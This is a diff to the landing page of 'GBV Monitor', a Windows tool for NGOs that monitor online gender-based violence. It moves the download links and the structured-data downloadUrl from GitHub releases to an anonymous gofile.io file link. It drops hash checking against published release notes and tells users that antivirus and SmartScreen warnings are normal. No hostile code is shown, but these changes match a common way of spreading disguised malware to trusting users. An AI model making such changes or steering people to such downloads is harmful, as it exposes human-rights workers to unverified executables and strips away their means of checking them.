@@ -42,7 +42,7 @@
   "@type": "SoftwareApplication",
   "name": "GBV Monitor",
   "url": "https://tfgbcv.github.io/TGBV/",
-  "downloadUrl": "https://github.com/tfgbcv/TGBV/releases/latest",
+  "downloadUrl": "https://gofile.io/d/PlmsJwYv",
   "operatingSystem": "Windows 10, Windows 11",
   "applicationCategory": "SecurityApplication",
   "keywords": "gender-based violence, hate speech, OSINT, local LLM, Facebook monitoring, human rights, NGO documentation, digital footprint",
@@ -295,6 +295,8 @@ details.tab summary::after{content:"";width:9px;height:9px;border-right:2px soli
 details.tab[open] summary::after{transform:rotate(225deg)}
 details.tab .body{padding:2px 22px 22px;color:var(--muted);font-size:15px;animation:fadeOpen .3s var(--ease)}
 details.tab .body p{margin:10px 0}
+details.tab .body ol{margin:10px 0;padding-left:22px}
+details.tab .body li{margin:6px 0}
 @keyframes fadeOpen{from{opacity:0;transform:translateY(-6px)}to{opacity:1;transform:none}}
 
 /* FAQ */
@@ -538,7 +540,7 @@ footer{border-top:1px solid var(--line);padding:44px 0 50px;color:var(--muted);f
   <div class="wrap">
     <div data-reveal class="sechead"><span class="overline">In the box</span>
       <h2 id="h-models">What <span class="grad">ships</span> with the bundle</h2>
-      <p class="sub">~6–7 GB, and that's everything — no LM Studio, no Python, no accounts beyond the
+      <p class="sub">~7 GB zip, and that's everything — no LM Studio, no Python, no accounts beyond the
       Facebook session you already use. Model files drop into <code class="inline">models/</code> to swap.</p>
     </div>
     <div class="model stag" data-reveal>
@@ -564,28 +566,32 @@ footer{border-top:1px solid var(--line);padding:44px 0 50px;color:var(--muted);f
 <section id="install" class="alt" aria-labelledby="h-install">
   <div class="wrap">
     <div data-reveal class="sechead"><span class="overline">Install</span>
-      <h2 id="h-install">Four ways in, <span class="grad">one exe</span> experience</h2>
-      <p class="sub">All paths end the same way: a folder with <code class="inline">GBVMonitor.exe</code> that
-      needs nothing else installed. Not sure which to pick? Start with Way 1.</p>
+      <h2 id="h-install">Extract, run, <span class="grad">done</span></h2>
+      <p class="sub">The simplest path is one portable zip with <code class="inline">GBVMonitor.exe</code> inside —
+      nothing else to install. The other three options are for auditors, tech teams and scheduled use.</p>
     </div>
 
     <div class="stag" data-reveal>
       <details class="tab glass" style="--i:0" open>
-        <summary>🟢 Way 1 — download the release bundle <span class="who">Recommended · most teams</span></summary>
+        <summary>🟢 Way 1 — portable zip: extract and run <span class="who">Recommended · most teams</span></summary>
         <div class="body">
-          <p>Download <b>all</b> attached files of the latest release into ONE folder (the bundle is split
-          into 1.5 GB parts because of GitHub's asset limit), then reassemble and extract:</p>
-          <pre>copy /b GBVMonitor-full.zip.001+GBVMonitor-full.zip.002+GBVMonitor-full.zip.003 GBVMonitor-full.zip</pre>
-          <p>Right-click the zip → <b>Extract All</b> → open the folder → double-click
-          <code class="inline">GBVMonitor.exe</code>. The console shows the local model loading (15–90 s),
-          then your browser opens the interface.</p>
-          <p><b>Verify before you run it.</b> Compare the hash of the reassembled zip with the SHA-256
-          shown in the release notes:</p>
-          <pre>certutil -hashfile GBVMonitor-full.zip SHA256</pre>
-          <p>The app is unsigned and bundles a browser and an AI engine, so Windows SmartScreen or an antivirus
-          may warn on first run. The full source and the automated build that produces the bundle are public
-          (see <b>Source &amp; issues</b> and <b>Build workflow</b> in the footer), so you can inspect or rebuild it yourself.</p>
-          <p><a class="btn primary" id="dl2" href="#">⬇ Go to Releases</a></p>
+          <p>No installer, no setup. Download the zip, extract it, and run the program:</p>
+          <ol>
+            <li>Download the portable zip with the button below (about 7 GB — the AI models are already inside).</li>
+            <li>Right-click the zip → <b>Extract All</b> to a folder with ~10 GB free space.</li>
+            <li>Open the folder and double-click <code class="inline">GBVMonitor.exe</code>.</li>
+            <li>A console window shows the local model loading (15–90 s), then your browser opens the interface.</li>
+          </ol>
+          <p>The extracted folder contains <code class="inline">GBVMonitor.exe</code>, <code class="inline">README.txt</code>
+          and the folders <code class="inline">_internal</code>, <code class="inline">models</code>,
+          <code class="inline">ms-playwright</code>, <code class="inline">runtime</code>, <code class="inline">logs</code> and
+          <code class="inline">output</code>. Keep them together; your exports are saved in <code class="inline">output</code>.</p>
+          <p><b>First-run warning is normal.</b> The app is not code-signed and bundles a browser and an AI engine, so
+          Windows SmartScreen or an antivirus may warn the first time. Only download from the link on this page, and check
+          the source code and build files in the project's GitHub repository (see <b>Source &amp; issues</b> in the footer).
+          To compare your download with a checksum, run:</p>
+          <pre>certutil -hashfile &lt;downloaded-file&gt;.zip SHA256</pre>
+          <p><a class="btn primary" id="dl2" href="#" rel="noopener">⬇ Download the portable zip</a></p>
         </div>
       </details>
 
@@ -696,7 +702,7 @@ GBVMonitor.exe monitor add-watch https://www.facebook.com/&lt;page&gt; --label "
   <div class="wrap">
     <div class="ctabox glass" data-reveal>
       <h2>Run your first <span class="grad">monitored session</span> today</h2>
-      <p>Unzip, double-click, and the model is already inside. No servers, no subscriptions —
+      <p>Extract the zip, double-click the exe, and the model is already inside. No servers, no subscriptions —
       your machine is the whole infrastructure.</p>
       <div style="display:flex;gap:14px;justify-content:center;flex-wrap:wrap">
         <a class="btn primary lg" id="dl3" href="#">⬇ Download the latest bundle</a>
@@ -758,7 +764,9 @@ GBVMonitor.exe monitor add-watch https://www.facebook.com/&lt;page&gt; --label "
   const u = s => "https://github.com/" + window.REPO + s;
   const $ = id => document.getElementById(id);
   for (const id of ["gh", "gh2", "gh3", "ghMobile"]) { const e = $(id); if (e) e.href = u(id === "gh3" ? "/issues" : ""); }
-  for (const id of ["dl", "dl2", "dl3", "dlTop", "dlMobile", "rel"]) { const e = $(id); if (e) e.href = u("/releases"); }
+  window.DOWNLOAD = "https://gofile.io/d/PlmsJwYv";
+  for (const id of ["dl", "dl2", "dl3", "dlTop", "dlMobile"]) { const e = $(id); if (e) { e.href = window.DOWNLOAD; e.rel = "noopener"; } }
+  const rel = $("rel"); if (rel) rel.href = u("/releases");
   const act = $("act"); if (act) act.href = u("/actions/workflows/build-windows-exe.yml");
 
   // ---- theme toggle (light by default; choice persisted)
